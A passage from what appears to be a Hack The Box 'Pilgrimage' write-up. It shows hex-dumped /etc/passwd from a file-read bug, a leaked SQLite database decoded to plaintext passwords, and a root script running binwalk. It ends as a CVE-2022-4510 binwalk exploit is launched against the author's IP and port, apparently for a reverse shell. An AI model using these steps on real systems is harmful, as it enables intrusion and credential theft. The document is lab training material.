</span></span><span class=line><span class=cl>  <span class=nx>Depth</span><span class=o>:</span> <span class=mi>1</span> <span class=nx>bits</span><span class=o>-</span><span class=nx>per</span><span class=o>-</span><span class=nx>pixel</span> <span class=nx>component</span>
</span></span><span class=line><span class=cl>  <span class=nx>Channel</span> <span class=nx>Depths</span><span class=o>:</span>
</span></span><span class=line><span class=cl>    <span class=nx>Red</span><span class=o>:</span>      <span class=mi>1</span> <span class=nx>bits</span>
</span></span><span class=line><span class=cl>    <span class=nx>Green</span><span class=o>:</span>    <span class=mi>1</span> <span class=nx>bits</span>
</span></span><span class=line><span class=cl>    <span class=nx>Blue</span><span class=o>:</span>     <span class=mi>1</span> <span class=nx>bits</span>
</span></span><span class=line><span class=cl>  <span class=nx>Channel</span> <span class=nx>Statistics</span><span class=o>:</span>
</span></span><span class=line><span class=cl>    <span class=nx>Red</span><span class=o>:</span>
</span></span><span class=line><span class=cl>      <span class=nx>Minimum</span><span class=o>:</span>                 <span class=mf>65535.00</span> <span class=p>(</span><span class=mf>1.0000</span><span class=p>)</span>
</span></span><span class=line><span class=cl>      <span class=nx>Maximum</span><span class=o>:</span>                 <span class=mf>65535.00</span> <span class=p>(</span><span class=mf>1.0000</span><span class=p>)</span>
</span></span><span class=line><span class=cl>      <span class=nx>Mean</span><span class=o>:</span>                    <span class=mf>65535.00</span> <span class=p>(</span><span class=mf>1.0000</span><span class=p>)</span>
</span></span><span class=line><span class=cl>      <span class=nx>Standard</span> <span class=nx>Deviation</span><span class=o>:</span>          <span class=mf>0.00</span> <span class=p>(</span><span class=mf>0.0000</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=nx>Green</span><span class=o>:</span>
</span></span><span class=line><span class=cl>      <span class=nx>Minimum</span><span class=o>:</span>                     <span class=mf>0.00</span> <span class=p>(</span><span class=mf>0.0000</span><span class=p>)</span>
</span></span><span class=line><span class=cl>      <span class=nx>Maximum</span><span class=o>:</span>                     <span class=mf>0.00</span> <span class=p>(</span><span class=mf>0.0000</span><span class=p>)</span>
</span></span><span class=line><span class=cl>      <span class=nx>Mean</span><span class=o>:</span>                        <span class=mf>0.00</span> <span class=p>(</span><span class=mf>0.0000</span><span class=p>)</span>
</span></span><span class=line><span class=cl>      <span class=nx>Standard</span> <span class=nx>Deviation</span><span class=o>:</span>          <span class=mf>0.00</span> <span class=p>(</span><span class=mf>0.0000</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=nx>Blue</span><span class=o>:</span>
</span></span><span class=line><span class=cl>      <span class=nx>Minimum</span><span class=o>:</span>                     <span class=mf>0.00</span> <span class=p>(</span><span class=mf>0.0000</span><span class=p>)</span>
</span></span><span class=line><span class=cl>      <span class=nx>Maximum</span><span class=o>:</span>                     <span class=mf>0.00</span> <span class=p>(</span><span class=mf>0.0000</span><span class=p>)</span>
</span></span><span class=line><span class=cl>      <span class=nx>Mean</span><span class=o>:</span>                        <span class=mf>0.00</span> <span class=p>(</span><span class=mf>0.0000</span><span class=p>)</span>
</span></span><span class=line><span class=cl>      <span class=nx>Standard</span> <span class=nx>Deviation</span><span class=o>:</span>          <span class=mf>0.00</span> <span class=p>(</span><span class=mf>0.0000</span><span class=p>)</span>
</span></span><span class=line><span class=cl>  <span class=nx>Colors</span><span class=o>:</span> <span class=mi>2</span>
</span></span><span class=line><span class=cl>    <span class=mi>0</span><span class=o>:</span> <span class=p>(</span><span class=mi>255</span><span class=p>,</span>  <span class=mi>0</span><span class=p>,</span>  <span class=mi>0</span><span class=p>)</span>	  <span class=nx>red</span>
</span></span><span class=line><span class=cl>    <span class=mi>1</span><span class=o>:</span> <span class=p>(</span><span class=mi>255</span><span class=p>,</span><span class=mi>255</span><span class=p>,</span><span class=mi>255</span><span class=p>)</span>	  <span class=nx>white</span>
</span></span><span class=line><span class=cl>  <span class=nx>Gamma</span><span class=o>:</span> <span class=mf>0.45455</span>
</span></span><span class=line><span class=cl>  <span class=nx>Chromaticity</span><span class=o>:</span>
</span></span><span class=line><span class=cl>    <span class=nx>red</span> <span class=nx>primary</span><span class=o>:</span> <span class=p>(</span><span class=mf>0.64</span><span class=p>,</span><span class=mf>0.33</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=nx>green</span> <span class=nx>primary</span><span class=o>:</span> <span class=p>(</span><span class=mf>0.3</span><span class=p>,</span><span class=mf>0.6</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=nx>blue</span> <span class=nx>primary</span><span class=o>:</span> <span class=p>(</span><span class=mf>0.15</span><span class=p>,</span><span class=mf>0.06</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=nx>white</span> <span class=nx>point</span><span class=o>:</span> <span class=p>(</span><span class=mf>0.3127</span><span class=p>,</span><span class=mf>0.329</span><span class=p>)</span>
</span></span><span class=line><span class=cl>  <span class=nx>Filesize</span><span class=o>:</span> <span class=mf>1.1</span><span class=nx>Ki</span>
</span></span><span class=line><span class=cl>  <span class=nx>Interlace</span><span class=o>:</span> <span class=nx>No</span>
</span></span><span class=line><span class=cl>  <span class=nx>Orientation</span><span class=o>:</span> <span class=nx>Unknown</span>
</span></span><span class=line><span class=cl>  <span class=nx>Background</span> <span class=nx>Color</span><span class=o>:</span> <span class=err>#</span><span class=nx>FEFEFE</span>
</span></span><span class=line><span class=cl>  <span class=nx>Border</span> <span class=nx>Color</span><span class=o>:</span> <span class=err>#</span><span class=nx>DFDFDF</span>
</span></span><span class=line><span class=cl>  <span class=nx>Matte</span> <span class=nx>Color</span><span class=o>:</span> <span class=err>#</span><span class=nx>BDBDBD</span>
</span></span><span class=line><span class=cl>  <span class=nx>Page</span> <span class=nx>geometry</span><span class=o>:</span> <span class=mi>100</span><span class=nx>x100</span><span class=o>+</span><span class=mi>0</span><span class=o>+</span><span class=mi>0</span>
</span></span><span class=line><span class=cl>  <span class=nx>Compose</span><span class=o>:</span> <span class=nx>Over</span>
</span></span><span class=line><span class=cl>  <span class=nx>Dispose</span><span class=o>:</span> <span class=nx>Undefined</span>
</span></span><span class=line><span class=cl>  <span class=nx>Iterations</span><span class=o>:</span> <span class=mi>0</span>
</span></span><span class=line><span class=cl>  <span class=nx>Compression</span><span class=o>:</span> <span class=nx>Zip</span>
</span></span><span class=line><span class=cl>  <span class=nx>Png</span><span class=o>:</span><span class=nx>IHDR</span><span class=p>.</span><span class=nx>color</span><span class=o>-</span><span class=nx>type</span><span class=o>-</span><span class=nx>orig</span><span class=o>:</span> <span class=mi>3</span>
</span></span><span class=line><span class=cl>  <span class=nx>Png</span><span class=o>:</span><span class=nx>IHDR</span><span class=p>.</span><span class=nx>bit</span><span class=o>-</span><span class=nx>depth</span><span class=o>-</span><span class=nx>orig</span><span class=o>:</span> <span class=mi>1</span>
</span></span><span class=line><span class=cl>  <span class=nx>Raw</span> <span class=nx>profile</span> <span class=nx>type</span><span class=o>:</span> 
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=mi>1437</span>
</span></span><span class=line><span class=cl><span class=mi>726</span><span class=nx>f6f743a783a303a303a726f6f743a2f726f6f743a2f62696e2f626173680a6461656d</span>
</span></span><span class=line><span class=cl><span class=mi>6</span><span class=nx>f6e3a783a313a313a6461656d6f6e3a2f7573722f7362696e3a2f7573722f7362696e2f</span>
</span></span><span class=line><span class=cl><span class=mi>6</span><span class=nx>e6f6c6f67696e0a62696e3a783a323a323a62696e3a2f62696e3a2f7573722f7362696e</span>
</span></span><span class=line><span class=cl><span class=mi>2</span><span class=nx>f6e6f6c6f67696e0a7379733a783a333a333a7379733a2f6465763a2f7573722f736269</span>
</span></span><span class=line><span class=cl><span class=mi>6</span><span class=nx>e2f6e6f6c6f67696e0a73796e633a783a343a36353533343a73796e633a2f62696e3a2f</span>
</span></span><span class=line><span class=cl><span class=mi>62696</span><span class=nx>e2f73796e630a67616d65733a783a353a36303a67616d65733a2f7573722f67616d</span>
</span></span><span class=line><span class=cl><span class=mi>65733</span><span class=nx>a2f7573722f7362696e2f6e6f6c6f67696e0a6d616e3a783a363a31323a6d616e3a</span>
</span></span><span class=line><span class=cl><span class=mi>2</span><span class=nx>f7661722f63616368652f6d616e3a2f7573722f7362696e2f6e6f6c6f67696e0a6c703a</span>
</span></span><span class=line><span class=cl><span class=mi>783</span><span class=nx>a373a373a6c703a2f7661722f73706f6f6c2f6c70643a2f7573722f7362696e2f6e6f</span>
</span></span><span class=line><span class=cl><span class=mi>6</span><span class=nx>c6f67696e0a6d61696c3a783a383a383a6d61696c3a2f7661722f6d61696c3a2f757372</span>
</span></span><span class=line><span class=cl><span class=mi>2</span><span class=nx>f7362696e2f6e6f6c6f67696e0a6e6577733a783a393a393a6e6577733a2f7661722f73</span>
</span></span><span class=line><span class=cl><span class=mi>706</span><span class=nx>f6f6c2f6e6577733a2f7573722f7362696e2f6e6f6c6f67696e0a757563703a783a31</span>
</span></span><span class=line><span class=cl><span class=mi>303</span><span class=nx>a31303a757563703a2f7661722f73706f6f6c2f757563703a2f7573722f7362696e2f</span>
</span></span><span class=line><span class=cl><span class=mi>6</span><span class=nx>e6f6c6f67696e0a70726f78793a783a31333a31333a70726f78793a2f62696e3a2f7573</span>
</span></span><span class=line><span class=cl><span class=mi>722</span><span class=nx>f7362696e2f6e6f6c6f67696e0a7777772d646174613a783a33333a33333a7777772d</span>
</span></span><span class=line><span class=cl><span class=mi>646174613</span><span class=nx>a2f7661722f7777773a2f7573722f7362696e2f6e6f6c6f67696e0a6261636b</span>
</span></span><span class=line><span class=cl><span class=mi>75703</span><span class=nx>a783a33343a33343a6261636b75703a2f7661722f6261636b7570733a2f7573722f</span>
</span></span><span class=line><span class=cl><span class=mi>7362696</span><span class=nx>e2f6e6f6c6f67696e0a6c6973743a783a33383a33383a4d61696c696e67204c69</span>
</span></span><span class=line><span class=cl><span class=mi>7374204</span><span class=nx>d616e616765723a2f7661722f6c6973743a2f7573722f7362696e2f6e6f6c6f67</span>
</span></span><span class=line><span class=cl><span class=mi>696</span><span class=nx>e0a6972633a783a33393a33393a697263643a2f72756e2f697263643a2f7573722f73</span>
</span></span><span class=line><span class=cl><span class=mi>62696</span><span class=nx>e2f6e6f6c6f67696e0a676e6174733a783a34313a34313a476e617473204275672d</span>
</span></span><span class=line><span class=cl><span class=mi>5265706</span><span class=nx>f7274696e672053797374656d202861646d696e293a2f7661722f6c69622f676e</span>
</span></span><span class=line><span class=cl><span class=mi>6174733</span><span class=nx>a2f7573722f7362696e2f6e6f6c6f67696e0a6e6f626f64793a783a3635353334</span>
</span></span><span class=line><span class=cl><span class=mi>3</span><span class=nx>a36353533343a6e6f626f64793a2f6e6f6e6578697374656e743a2f7573722f7362696e</span>
</span></span><span class=line><span class=cl><span class=mi>2</span><span class=nx>f6e6f6c6f67696e0a5f6170743a783a3130303a36353533343a3a2f6e6f6e6578697374</span>
</span></span><span class=line><span class=cl><span class=mi>656</span><span class=nx>e743a2f7573722f7362696e2f6e6f6c6f67696e0a73797374656d642d6e6574776f72</span>
</span></span><span class=line><span class=cl><span class=mi>6</span><span class=nx>b3a783a3130313a3130323a73797374656d64204e6574776f726b204d616e6167656d65</span>
</span></span><span class=line><span class=cl><span class=mi>6</span><span class=nx>e742c2c2c3a2f72756e2f73797374656d643a2f7573722f7362696e2f6e6f6c6f67696e</span>
</span></span><span class=line><span class=cl><span class=mi>0</span><span class=nx>a73797374656d642d7265736f6c76653a783a3130323a3130333a73797374656d642052</span>
</span></span><span class=line><span class=cl><span class=mi>65736</span><span class=nx>f6c7665722c2c2c3a2f72756e2f73797374656d643a2f7573722f7362696e2f6e6f</span>
</span></span><span class=line><span class=cl><span class=mi>6</span><span class=nx>c6f67696e0a6d6573736167656275733a783a3130333a3130393a3a2f6e6f6e65786973</span>
</span></span><span class=line><span class=cl><span class=mi>74656</span><span class=nx>e743a2f7573722f7362696e2f6e6f6c6f67696e0a73797374656d642d74696d6573</span>
</span></span><span class=line><span class=cl><span class=mi>796</span><span class=nx>e633a783a3130343a3131303a73797374656d642054696d652053796e6368726f6e69</span>
</span></span><span class=line><span class=cl><span class=mi>7</span><span class=nx>a6174696f6e2c2c2c3a2f72756e2f73797374656d643a2f7573722f7362696e2f6e6f6c</span>
</span></span><span class=line><span class=cl><span class=mi>6</span><span class=nx>f67696e0a656d696c793a783a313030303a313030303a656d696c792c2c2c3a2f686f6d</span>
</span></span><span class=line><span class=cl><span class=mi>652</span><span class=nx>f656d696c793a2f62696e2f626173680a73797374656d642d636f726564756d703a78</span>
</span></span><span class=line><span class=cl><span class=mi>3</span><span class=nx>a3939393a3939393a73797374656d6420436f72652044756d7065723a2f3a2f7573722f</span>
</span></span><span class=line><span class=cl><span class=mi>7362696</span><span class=nx>e2f6e6f6c6f67696e0a737368643a783a3130353a36353533343a3a2f72756e2f</span>
</span></span><span class=line><span class=cl><span class=mi>737368643</span><span class=nx>a2f7573722f7362696e2f6e6f6c6f67696e0a5f6c617572656c3a783a393938</span>
</span></span><span class=line><span class=cl><span class=mi>3</span><span class=nx>a3939383a3a2f7661722f6c6f672f6c617572656c3a2f62696e2f66616c73650a</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>  <span class=nb>Date</span><span class=o>:</span><span class=nx>create</span><span class=o>:</span> <span class=mi>2023</span><span class=o>-</span><span class=mi>11</span><span class=o>-</span><span class=mi>22</span><span class=nx>T16</span><span class=o>:</span><span class=mi>52</span><span class=o>:</span><span class=mi>00</span><span class=o>+</span><span class=mi>00</span><span class=o>:</span><span class=mi>00</span>
</span></span><span class=line><span class=cl>  <span class=nb>Date</span><span class=o>:</span><span class=nx>modify</span><span class=o>:</span> <span class=mi>2023</span><span class=o>-</span><span class=mi>11</span><span class=o>-</span><span class=mi>22</span><span class=nx>T16</span><span class=o>:</span><span class=mi>52</span><span class=o>:</span><span class=mi>00</span><span class=o>+</span><span class=mi>00</span><span class=o>:</span><span class=mi>00</span>
</span></span><span class=line><span class=cl>  <span class=nb>Date</span><span class=o>:</span><span class=nx>timestamp</span><span class=o>:</span> <span class=mi>2023</span><span class=o>-</span><span class=mi>11</span><span class=o>-</span><span class=mi>22</span><span class=nx>T16</span><span class=o>:</span><span class=mi>52</span><span class=o>:</span><span class=mi>01</span><span class=o>+</span><span class=mi>00</span><span class=o>:</span><span class=mi>00</span>
</span></span><span class=line><span class=cl>  <span class=nx>Signature</span><span class=o>:</span> <span class=nx>c7d03a3453434db9720fd67b559185125d9bdb1fe9c25c182783170e2ba6a8f6</span>
</span></span><span class=line><span class=cl>  <span class=nx>Tainted</span><span class=o>:</span> <span class=nx>False</span>
</span></span><span class=line><span class=cl>  <span class=nx>User</span> <span class=nx>Time</span><span class=o>:</span> <span class=mf>0.010</span><span class=nx>u</span>
</span></span><span class=line><span class=cl>  <span class=nx>Elapsed</span> <span class=nx>Time</span><span class=o>:</span> <span class=mi>0</span><span class=nx>m</span><span class=o>:</span><span class=mf>0.002919</span><span class=nx>s</span>
</span></span><span class=line><span class=cl>  <span class=nx>Pixels</span> <span class=nx>Per</span> <span class=nx>Second</span><span class=o>:</span> <span class=mf>3.3</span><span class=nx>Mi</span>
</span></span></code></pre></div><p><img alt=Untitled loading=lazy src=/posts/pilgrimage/Pilgrimage%20e11ff2958bc6407d8931fe77ab0a568f/Untitled%202.png></p><p>So, we are able to read files, what more info can we get from this? From the source files we can see that, there’s one SQLite file that is being read for login and loading images in the source code. We can go ahead and try to read that file.</p><p><img alt=Untitled loading=lazy src=/posts/pilgrimage/Pilgrimage%20e11ff2958bc6407d8931fe77ab0a568f/Untitled%203.png></p><p>We were able to get the SQLite file but in unformatted hex format and it was a bad option to retrieve the original with cyberchef. So, we can initially remove all the unnecessary new line characters. Here, I took the help of chatGPT after trying on my own.</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>sed -i <span class=s1>&#39;:a;N;$!ba;s/\n//g&#39;</span> db
</span></span></code></pre></div><p>Then I created a simple Python script to decode the hex data and write the database file as binary. So that we can read it with SQLite.</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>┌─<span class=o>[</span>noob@parrot<span class=o>]</span>─<span class=o>[</span>~/htb/pilgrimage/notes/lfi<span class=o>]</span>
</span></span><span class=line><span class=cl>└──╼ <span class=nv>$cat</span> script.py 
</span></span><span class=line><span class=cl><span class=nv>f</span> <span class=o>=</span> open<span class=o>(</span><span class=s2>&#34;db&#34;</span>,<span class=s2>&#34;r&#34;</span><span class=o>)</span>
</span></span><span class=line><span class=cl><span class=nv>data</span> <span class=o>=</span> f.read<span class=o>()</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=nv>data</span> <span class=o>=</span> bytes.fromhex<span class=o>(</span>data<span class=o>)</span>
</span></span><span class=line><span class=cl><span class=c1>#print(data)</span>
</span></span><span class=line><span class=cl>with open<span class=o>(</span><span class=s2>&#34;res.db&#34;</span>,<span class=s2>&#34;wb&#34;</span><span class=o>)</span> as dest:
</span></span><span class=line><span class=cl>    dest.write<span class=o>(</span>data<span class=o>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>f.close<span class=o>()</span>
</span></span></code></pre></div><p>We were able to successfully retrieve credentials from the database file for three users and one of them <code>emily</code> had ssh access.</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>┌─<span class=o>[</span>✗<span class=o>]</span>─<span class=o>[</span>noob@parrot<span class=o>]</span>─<span class=o>[</span>~/htb/pilgrimage/notes/lfi<span class=o>]</span>
</span></span><span class=line><span class=cl>└──╼ <span class=nv>$sqlite3</span> res.db 
</span></span><span class=line><span class=cl>SQLite version 3.34.1 2021-01-20 14:10:07
</span></span><span class=line><span class=cl>Enter <span class=s2>&#34;.help&#34;</span> <span class=k>for</span> usage hints.
</span></span><span class=line><span class=cl>sqlite&gt; .tables
</span></span><span class=line><span class=cl>images  users 
</span></span><span class=line><span class=cl>sqlite&gt; <span class=k>select</span> * from users<span class=p>;</span>
</span></span><span class=line><span class=cl>emily<span class=p>|</span>abigchonkyboi123
</span></span><span class=line><span class=cl>admin<span class=p>|</span>admin
</span></span><span class=line><span class=cl>administrator<span class=p>|</span>administrator
</span></span></code></pre></div><h3 id=privilege-escalation>Privilege Escalation<a hidden class=anchor aria-hidden=true href=#privilege-escalation>#</a></h3><p>After logging into <code>emily</code> we looked at what we could run as sudo but there wasn&rsquo;t much.On enumerating internal processes with pspy, one of the processes seemed interesting which ran as root and executed the script <code>“/usr/sbin/malewarescan.sh</code>”</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-jsx data-lang=jsx><span class=line><span class=cl><span class=mi>2023</span><span class=o>/</span><span class=mi>11</span><span class=o>/</span><span class=mi>23</span> <span class=mi>04</span><span class=o>:</span><span class=mi>27</span><span class=o>:</span><span class=mi>15</span> <span class=nx>CMD</span><span class=o>:</span> <span class=nx>UID</span><span class=o>=</span><span class=mi>0</span>     <span class=nx>PID</span><span class=o>=</span><span class=mi>781</span>    <span class=o>|</span> <span class=err>/lib/systemd/systemd-logind </span>
</span></span><span class=line><span class=cl><span class=mi>2023</span><span class=o>/</span><span class=mi>11</span><span class=o>/</span><span class=mi>23</span> <span class=mi>04</span><span class=o>:</span><span class=mi>27</span><span class=o>:</span><span class=mi>15</span> <span class=nx>CMD</span><span class=o>:</span> <span class=nx>UID</span><span class=o>=</span><span class=mi>0</span>     <span class=nx>PID</span><span class=o>=</span><span class=mi>776</span>    <span class=o>|</span> 
</span></span><span class=line><span class=cl><span class=mi>2023</span><span class=o>/</span><span class=mi>11</span><span class=o>/</span><span class=mi>23</span> <span class=mi>04</span><span class=o>:</span><span class=mi>27</span><span class=o>:</span><span class=mi>15</span> <span class=nx>CMD</span><span class=o>:</span> <span class=nx>UID</span><span class=o>=</span><span class=mi>0</span>     <span class=nx>PID</span><span class=o>=</span><span class=mi>770</span>    <span class=o>|</span> <span class=err>/usr/sbin/rsyslogd -n -iNONE </span>
</span></span><span class=line><span class=cl><span class=mi>2023</span><span class=o>/</span><span class=mi>11</span><span class=o>/</span><span class=mi>23</span> <span class=mi>04</span><span class=o>:</span><span class=mi>27</span><span class=o>:</span><span class=mi>15</span> <span class=nx>CMD</span><span class=o>:</span> <span class=nx>UID</span><span class=o>=</span><span class=mi>0</span>     <span class=nx>PID</span><span class=o>=</span><span class=mi>766</span>    <span class=o>|</span> <span class=err>/bin/bash /usr/sbin/malwarescan.sh </span>
</span></span><span class=line><span class=cl><span class=mi>2023</span><span class=o>/</span><span class=mi>11</span><span class=o>/</span><span class=mi>23</span> <span class=mi>04</span><span class=o>:</span><span class=mi>27</span><span class=o>:</span><span class=mi>15</span> <span class=nx>CMD</span><span class=o>:</span> <span class=nx>UID</span><span class=o>=</span><span class=mi>0</span>     <span class=nx>PID</span><span class=o>=</span><span class=mi>765</span>    <span class=o>|</span> <span class=err>/usr/bin/inotifywait -m -e create /var/www/pilgrimage.htb/shrunk/ </span>
</span></span><span class=line><span class=cl><span class=mi>2023</span><span class=o>/</span><span class=mi>11</span><span class=o>/</span><span class=mi>23</span> <span class=mi>04</span><span class=o>:</span><span class=mi>27</span><span class=o>:</span><span class=mi>15</span> <span class=nx>CMD</span><span class=o>:</span> <span class=nx>UID</span><span class=o>=</span><span class=mi>0</span>     <span class=nx>PID</span><span class=o>=</span><span class=mi>764</span>    <span class=o>|</span> <span class=nx>php</span><span class=o>-</span><span class=nx>fpm</span><span class=o>:</span> <span class=nx>master</span> <span class=nx>process</span> <span class=p>(</span><span class=err>/etc/php/7.4/fpm/php-fpm.conf)                       </span>
</span></span><span class=line><span class=cl><span class=mi>2023</span><span class=o>/</span><span class=mi>11</span><span class=o>/</span><span class=mi>23</span> <span class=mi>04</span><span class=o>:</span><span class=mi>27</span><span class=o>:</span><span class=mi>15</span> <span class=nx>CMD</span><span class=o>:</span> <span class=nx>UID</span><span class=o>=</span><span class=mi>0</span>     <span class=nx>PID</span><span class=o>=</span><span class=mi>758</span>    <span class=o>|</span> <span class=err>/bin/bash /usr/sbin/malwarescan.sh </span>
</span></span><span class=line><span class=cl><span class=mi>2023</span><span class=o>/</span><span class=mi>11</span><span class=o>/</span><span class=mi>23</span> <span class=mi>04</span><span class=o>:</span><span class=mi>27</span><span class=o>:</span><span class=mi>15</span> <span class=nx>CMD</span><span class=o>:</span> <span class=nx>UID</span><span class=o>=</span><span class=mi>103</span>   <span class=nx>PID</span><span class=o>=</span><span class=mi>753</span>    <span class=o>|</span> <span class=err>/usr/bin/dbus-daemon --system --address=systemd: --nofork --nopidfile --systemd-activation --syslog-only </span>
</span></span><span class=line><span class=cl><span class=mi>2023</span><span class=o>/</span><span class=mi>11</span><span class=o>/</span><span class=mi>23</span> <span class=mi>04</span><span class=o>:</span><span class=mi>27</span><span class=o>:</span><span class=mi>15</span> <span class=nx>CMD</span><span class=o>:</span> <span class=nx>UID</span><span class=o>=</span><span class=mi>0</span>     <span class=nx>PID</span><span class=o>=</span><span class=mi>750</span>    <span class=o>|</span> <span class=err>/usr/sbin/cron -f</span>
</span></span></code></pre></div><p>Went ahead and looked into the script and it was checking if a new file is created inside the directory “<code>/var/www/pilgrimage.htb/shrunk/</code>”, then it would read the file name and try to extract embedded binary files from the newly created file and after iterating over the extracted files and if detecting any Microsoft executable or executable script would remove the new file and break out of the loop.</p><p>It was actually made with the intention that when a user uploads any image file with executable binary embedded inside it, it would be removed so as to prevent unwanted malicious activity, also the shrunk folder was available to the end users. So, it could have been a possible attack vector.</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>emily@pilgrimage:/dev/shm$ cat /usr/sbin/malwarescan.sh 
</span></span><span class=line><span class=cl><span class=c1>#!/bin/bash</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=nv>blacklist</span><span class=o>=(</span><span class=s2>&#34;Executable script&#34;</span> <span class=s2>&#34;Microsoft executable&#34;</span><span class=o>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>/usr/bin/inotifywait -m -e create /var/www/pilgrimage.htb/shrunk/ <span class=p>|</span> <span class=k>while</span> <span class=nb>read</span> FILE<span class=p>;</span> <span class=k>do</span>
</span></span><span class=line><span class=cl>	<span class=nv>filename</span><span class=o>=</span><span class=s2>&#34;/var/www/pilgrimage.htb/shrunk/</span><span class=k>$(</span>/usr/bin/echo <span class=s2>&#34;</span><span class=nv>$FILE</span><span class=s2>&#34;</span> <span class=p>|</span> /usr/bin/tail -n <span class=m>1</span> <span class=p>|</span> /usr/bin/sed -n -e <span class=s1>&#39;s/^.*CREATE //p&#39;</span><span class=k>)</span><span class=s2>&#34;</span>
</span></span><span class=line><span class=cl>	<span class=nv>binout</span><span class=o>=</span><span class=s2>&#34;</span><span class=k>$(</span>/usr/local/bin/binwalk -e <span class=s2>&#34;</span><span class=nv>$filename</span><span class=s2>&#34;</span><span class=k>)</span><span class=s2>&#34;</span>
</span></span><span class=line><span class=cl>        <span class=k>for</span> banned in <span class=s2>&#34;</span><span class=si>${</span><span class=nv>blacklist</span><span class=p>[@]</span><span class=si>}</span><span class=s2>&#34;</span><span class=p>;</span> <span class=k>do</span>
</span></span><span class=line><span class=cl>		<span class=k>if</span> <span class=o>[[</span> <span class=s2>&#34;</span><span class=nv>$binout</span><span class=s2>&#34;</span> <span class=o>==</span> *<span class=s2>&#34;</span><span class=nv>$banned</span><span class=s2>&#34;</span>* <span class=o>]]</span><span class=p>;</span> <span class=k>then</span>
</span></span><span class=line><span class=cl>			/usr/bin/rm <span class=s2>&#34;</span><span class=nv>$filename</span><span class=s2>&#34;</span>
</span></span><span class=line><span class=cl>			<span class=nb>break</span>
</span></span><span class=line><span class=cl>		<span class=k>fi</span>
</span></span><span class=line><span class=cl>	<span class=k>done</span>
</span></span><span class=line><span class=cl><span class=k>done</span>
</span></span></code></pre></div><p>Here, after checking the <code>binwalk</code> version, we can say that it was vulnerable to remote code execution.</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-jsx data-lang=jsx><span class=line><span class=cl><span class=nx>emily</span><span class=err>@</span><span class=nx>pilgrimage</span><span class=o>:</span><span class=err>/usr/local/bin$ ./binwalk </span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=nx>Binwalk</span> <span class=nx>v2</span><span class=mf>.3.2</span>
</span></span><span class=line><span class=cl><span class=nx>Craig</span> <span class=nx>Heffner</span><span class=p>,</span> <span class=nx>ReFirmLabs</span>
</span></span><span class=line><span class=cl><span class=nx>https</span><span class=o>:</span><span class=c1>//github.com/ReFirmLabs/binwalk
</span></span></span></code></pre></div><h3 id=cve-2022-4510>CVE-2022-4510<a hidden class=anchor aria-hidden=true href=#cve-2022-4510>#</a></h3><p>An interesting point to note here is that there were two possible ways to trigger the exploit with the malicious payload. Either we can upload a file directly from the web portal or we can put the payload directly into the directory from our ssh session.</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-jsx data-lang=jsx><span class=line><span class=cl><span class=err>┌─</span><span class=p>[</span><span class=nx>noob</span><span class=err>@</span><span class=nx>parrot</span><span class=p>]</span><span class=err>─</span><span class=p>[</span><span class=o>~</span><span class=err>/htb/pilgrimage/notes/priv]</span>
</span></span><span class=line><span class=cl><span class=err>└──╼</span> <span class=nx>$python3</span> <span class=nx>bin</span><span class=o>-</span><span class=nx>cve</span><span class=p>.</span><span class=nx>py</span> <span class=nx>exploit</span> <span class=mf>10.10.14.111</span> <span class=mi>9001</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=err>################################################</span>
</span></span><span class=line><span class=cl><span class=o>------------------</span><span class=nx>CVE</span><span class=o>-</span><span class=mi>2022</span><span class=o>-</span><span class=mi>4510</span><span class=o>----------------</span>
</span></span><span class=line><span class=cl><span class=err>################################################</span>
</span></span><span class=line><span class=cl><span class=o>--------</span><span class=nx>Binwalk</span> <span class=nx>Remote</span> <span class=nx>Command</span> <span class=nx>Execution</span><span class=o>--------</span>
</span></span><span class=line><span class=cl><span class=o>------</span><span class=nx>Binwalk</span> <span class=mf>2.1.2</span><span class=nx>b</span> <span class=nx>through</span> <span class=mf>2.3.2</span> <span class=nx>included</span><span class=o>-----</span>
</span></span><span class=line><span class=cl><span class=o>------------------------------------------------</span>
</span></span><span class=line><span class=cl><span class=err>################################################</span>
</span></span><span class=line><span class=cl><span class=o>----------</span><span class=nx>Exploit</span> <span class=nx>by</span><span class=o>:</span> <span class=nx>Etienne</span> <span class=nx>Lacoche</span><span class=o>-----------</span>
</span></span><span class=line><span class=cl><span class=o>---------</span><span class=nx>Contact</span> <span class=nx>Twitter</span><span class=o>:</span> <span class=err>@</span><span class=nx>electr0sm0g</span><span class=o>----------</span>
</span></span><span class=line><span class=cl><span class=o>------------------</span><span class=nx>Discovered</span> <span class=nx>by</span><span class=o>:----------------</span>
</span></span><span class=line><span class=cl><span class=o>---------</span><span class=nx>Q</span><span class=p>.</span> <span class=nx>Kaiser</span><span class=p>,</span> <span class=nx>ONEKEY</span> <span class=nx>Research</span> <span class=nx>Lab</span><span class=o>---------</span>
</span></span><span class=line><span class=cl><span class=o>---------</span><span class=nx>Exploit</span> <span class=nx>tested</span> <span class=nx>on</span> <span class=nx>debian</span> <span class=mi>11</span><span class=o>------------</span>
</span></span><span class=line><span class=cl><span class=err>################################################</span>
</span></span><span class=line><span class=cl>
